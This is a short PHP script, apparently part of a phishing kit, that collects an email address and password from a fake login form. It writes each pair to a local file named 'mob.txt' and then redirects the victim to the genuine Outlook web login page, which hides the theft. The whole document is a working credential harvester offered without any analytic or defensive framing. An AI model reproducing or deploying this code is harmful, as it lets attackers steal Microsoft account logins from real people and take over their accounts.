
<?php
if (!empty($_POST)) {
 $email = $_POST['email'];
 $senha = $_POST['semail'];

  $dados = "".$email.";".$senha."\r\n";



function gravar($texto,$ip1){
	$arquivo = $ip1;
	$fp = @fopen($arquivo, "a+");
	@fwrite($fp, $texto);
	@fclose($fp);
}


gravar($dados,"mob.txt");
header('Location: https://outlook.live.com/owa/');

}else{
	header('Location: index.php');
	}
//header('Location: https://login.live.com/');
?>